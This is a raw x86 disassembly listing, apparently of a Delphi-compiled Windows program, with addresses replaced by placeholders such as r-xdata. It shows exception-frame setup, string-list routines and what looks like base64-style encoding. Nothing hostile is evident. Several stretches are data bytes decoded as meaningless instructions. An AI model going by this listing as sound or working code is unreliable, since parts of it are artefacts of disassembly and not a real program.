lea eax [ ebx + 0x8 ]
push eax
mov ecx esi
sub ecx 0x1
jno r-xdata
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call esi
mov edi eax
test edi edi
jle r-xdata
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
mov ecx esi
add ecx 0x2
jno r-xdata
call sub_403e34
or ecx 0xffffffff
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
jmp r-xdata
lea eax [ ebx + 0x14 ]
push eax
mov ecx esi
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
test edi edi
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4053c4
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call esi
mov esi eax
lea eax [ ebx + 0x24 ]
push eax
mov ecx esi
sub ecx 0x1
jno r-xdata
call sub_403e34
lea eax [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
lea eax [ ebx + 0x4 ]
push eax
mov ecx edi
sub ecx 0x1
jno r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
test esi esi
jle r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48045c
lea eax [ ebp - 0x28 ]
mov edx 0xa
call sub_404e68
retn
lea eax [ ebx + 0x1c ]
mov edx [ ebx + 0x28 ]
call sub_404e98
push 0x1
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebx + 0x1c ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x28 ]
lea eax [ ebx + 0x28 ]
call sub_404e98
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
mov ecx edi
sub ecx 0x1
jno r-xdata
call sub_403e34
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebx + 0x24 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x20 ]
call sub_404e98
mov eax [ ebx + 0x20 ]
call sub_405120
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov ecx esi
mov edx 0x1
call sub_4053c4
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4053c4
lea eax [ ebx + 0x28 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
jmp r-xdata
call sub_403e34
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call esi
test eax eax
jle r-xdata
lea eax [ ebx + 0x24 ]
call sub_404e44
lea eax [ ebx + 0x4 ]
mov ecx esi
mov edx 0x1
call sub_4053c4
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x18 ]
call sub_404e98
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call esi
mov esi eax
mov edi [ rw-data ]
mov edi [ edi ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call edi
cmp esi eax
jle r-xdata
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call esi
mov edi eax
test edi edi
jle r-xdata
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
jmp r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x18 ]
call sub_404e98
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebx + 0x18 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
push 0x1
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov [ ebx + 0x2c ] 0x1
jmp r-xdata
or ecx 0xffffffff
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_47075c
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx esi
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
mov ecx [ ebp - 0x20 ]
lea eax [ ebx + 0x14 ]
mov edx r-xdata
call sub_405170
test edi edi
jle r-xdata
lea eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call esi
mov edi eax
test edi edi
jle r-xdata
lea eax [ ebx + 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
lea eax [ ebx + 0x4 ]
push eax
mov ecx edi
sub ecx 0x1
jno r-xdata
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405384
mov ecx edi
sub ecx 0x1
jno r-xdata
call sub_403e34
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4053c4
lea eax [ ebx + 0x28 ]
mov edx [ ebp - 0x8 ]
call sub_404e98
jmp r-xdata
call sub_403e34
lea eax [ ebx + 0x4 ]
mov ecx esi
mov edx 0x1
call sub_4053c4
lea eax [ ebx + 0x1c ]
mov edx [ ebx + 0x4 ]
call sub_404e98
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebx + 0x1c ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x24 ]
lea eax [ ebx + 0x4 ]
call sub_404e98
jmp r-xdata
sub_4804d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48052b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_480540
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0xc ]
call sub_404e98
mov ecx esi
movzx edx [ r-xdata ]
mov eax ebx
call sub_480540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480532
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_480540
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x5 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4806a4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_405170
cmp [ ebx + 0x20 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
test [ ebp - 0x5 ] 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x18 ]
call sub_40512c
cmp [ ebx + 0x10 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x20 ]
call sub_40512c
cmp [ ebx + 0x24 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebx + 0x14 ]
push [ ebx + 0x4 ]
push [ ebx + 0x28 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx r-xdata
call sub_405270
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x24 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4806ab
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
test [ ebp - 0x5 ] 0x2
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x1c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4051e4
sub_480820
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
lea eax [ esi + 0x38 ]
mov edx r-xdata
call sub_404e98
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x3d ] 0x1
mov [ esi + 0x3e ] 0x1
mov [ esi + 0x40 ] 0x4e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_480884
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_480901
push [ fs : eax ]
mov [ fs : eax ] esp
add esi 0x1
jno r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480908
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx 0x1
call sub_464d34
test al al
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_48091c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4809b7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4809be
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
test esi esi
jl r-xdata
call sub_403e34
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_480ca4
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_480bd0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_464d00
test al al
je r-xdata
sub_4809c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_480ab9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_480ac8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_480a8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx 0x1
jno r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
sub ebx 0x1
jno r-xdata
call sub_403e34
cmp ebx 0xffffffff
jle r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480a96
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
sub ebx 0x1
jno r-xdata
cmp ebx 0xffffffff
jg r-xdata
call sub_403e34
sub_480ac8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_480b9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_480b6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x40 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_46fdd4
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_4627ac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480b72
retn
sub_480b72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480ba1
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_480bd0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_480c71
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esi + 0x3c ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x38 ]
mov eax [ r-xdata ]
call sub_4627ac
mov eax [ ebp - 0xc ]
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebx ]
call esi
mov esi eax
push ebx
mov ecx esi
sub ecx 0x1
jno r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx ]
mov eax [ r-xdata ]
call sub_4626d8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_404e98
mov eax [ ebx ]
mov edx 0x1
call sub_405384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480c78
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
call sub_403e34
sub_480c80
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_480e10
mov edx eax
mov ecx edi
mov eax ebx
call sub_480ca4
pop edi
pop esi
pop ebx
retn
sub_480ca4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_480de9
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
call sub_404e44
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
call sub_480bd0
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_405120
mov edx eax
add edx 0x2
jno r-xdata
mov ecx 0x7fffffff
pop eax
call sub_405384
cmp [ esi + 0x3d ] 0x0
je r-xdata
call sub_403e34
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480df0
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
add ebx 0x1
jno r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
je r-xdata
call sub_403e34
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_464d34
test al al
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ r-xdata ]
call sub_4626c4
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4626c4
push [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
jmp r-xdata
sub_480e10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_480e8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
test esi esi
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480e93
lea eax [ ebp - 0xc ]
call sub_404e44
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_480bd0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_464d00
test al al
je r-xdata
sub_480ea0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_480f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_480e10
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480f72
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
cmp [ ebx + 0x3e ] 0x0
je r-xdata
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax ebx
call sub_480884
push edi
push [ ebx + 0x38 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_480884
push edi
push [ ebx + 0x38 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_4809c4
jmp r-xdata
sub_4810f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_481164
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_464b0c
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4192e0
mov eax [ ebp - 0x4 ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48116b
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_481298
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebx ] dl
dec eax
add [ eax + 0x13 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
adc ecx [ eax ]
mov eax 0x30000000
adc [ eax ] cl
call 0xffffffffb84854a6
inc ecx
inc eax
add [ ebx + ebx * 8 ] ah
inc ecx
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbe26 ] ch
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
sub_4812f9
fild [ ecx ]
add dl ah
inc ecx
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + edx * 2 + 0x14040046 ] ch
dec eax
add ah ch
adc [ eax ] cl
[ eax ] cl
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x34004010 ] dh
add [ eax ] al
add [ esi ] cl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] cl
inc esi
je r-xdata
imul ebp [ esp + ebp * 2 + 0x43 ] 0x90726168
inc eax
add [ edi - 0x48010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080002 ] al
je r-xdata
bound ebp [ edx ]
clc
inc [ eax + 0xf ]
mov dh 0x4c
push es
dec [ edi ]
mov dh 0xc9
xor esp eax
adc cl [ eax ]
enter 0x4810 0x0
add eax [ eax ]
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
dec [ ebx + 0x7ed285d0 ]
dec edx
xor ecx [ ebp + 0x13480040 ]
dec eax
add [ edi ] al
push cs
push esp
dec ecx
inc ecx
mov ebx eax
sub ebx 0x1
jno r-xdata
call sub_403e2c
add [ eax ] al
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
cmp ebx 0xff
jbe r-xdata
call sub_403e34
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax esi
call sub_405120
mov edx eax
test edx edx
jle r-xdata
clc
inc [ ecx - 0x75 ]
fadd [ ebx + 0x57101eb ]
mov edx edi
xor al 0x1
add [ eax ] ch
adc [ eax ] al
mov bh 0x0
add bh bh
mov bh 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ esi + 0x69 ] al
insb
insb
inc ebx
push 0x53907261
push esi
push edi
mov edi ecx
mov esi edx
mov eax 0x7f
dec ecx
cmp ecx 0x7e
jbe r-xdata
inc eax
movzx ecx [ esi + eax - 0x1 ]
movzx ecx cl
mov [ edi + ecx - 0x1 ] bl
inc eax
dec edx
jne r-xdata
call sub_403e2c
pop edi
pop esi
pop ebx
retn
mov eax 0x1
dec eax
test esi esi
je r-xdata
sub_481394
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax 0x7f
mov edx edi
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax esi
call sub_405120
mov edx eax
test edx edx
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x1
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
inc eax
movzx ecx [ esi + eax - 0x1 ]
movzx ecx cl
dec ecx
cmp ecx 0x7e
jbe r-xdata
inc ecx
mov ebx eax
sub ebx 0x1
jno r-xdata
call sub_403e2c
cmp ebx 0xff
jbe r-xdata
call sub_403e34
mov [ edi + ecx - 0x1 ] bl
inc eax
dec edx
jne r-xdata
call sub_403e2c
dec eax
test esi esi
je r-xdata
sub_481404
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4814ac
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4814b3
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_405af0
retn
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_4646f0
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4814bc
push edi
mov ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
mov eax [ r-xdata ]
call sub_463610
sub_4814bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_48180f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edi + 0xb7 ]
mov [ ebp - 0x1d ] al
push 0x4
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx 0x3
cdq
idiv ecx
test edx edx
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_406248
test eax eax
jns r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
mov ecx 0x3
cdq
idiv ecx
imul eax eax 0x3
jno r-xdata
sar eax 0x2
imul eax eax 0x3
jno r-xdata
add eax 0x3
add eax 0x1
jno r-xdata
call sub_403e34
add eax 0x3
jno r-xdata
call sub_403e34
mov [ ebp - 0x14 ] eax
jmp r-xdata
call sub_403e34
mov [ ebp - 0x18 ] eax
cmp ebx [ ebp - 0x18 ]
jg r-xdata
call sub_403e34
mov [ ebp - 0x14 ] eax
jmp r-xdata
call sub_403e34
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebp - 0x8 ]
call sub_406248
sub eax 0x4
jno r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov eax ebx
sub eax 0x1
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481816
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0xc ]
jno r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e34
push eax
mov eax [ ebp + 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0x10 ] al
mov eax ebx
sub eax 0x1
jno r-xdata
add eax 0x1
jno r-xdata
call sub_403e34
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0xf ] al
mov eax ebx
sub eax 0x1
jno r-xdata
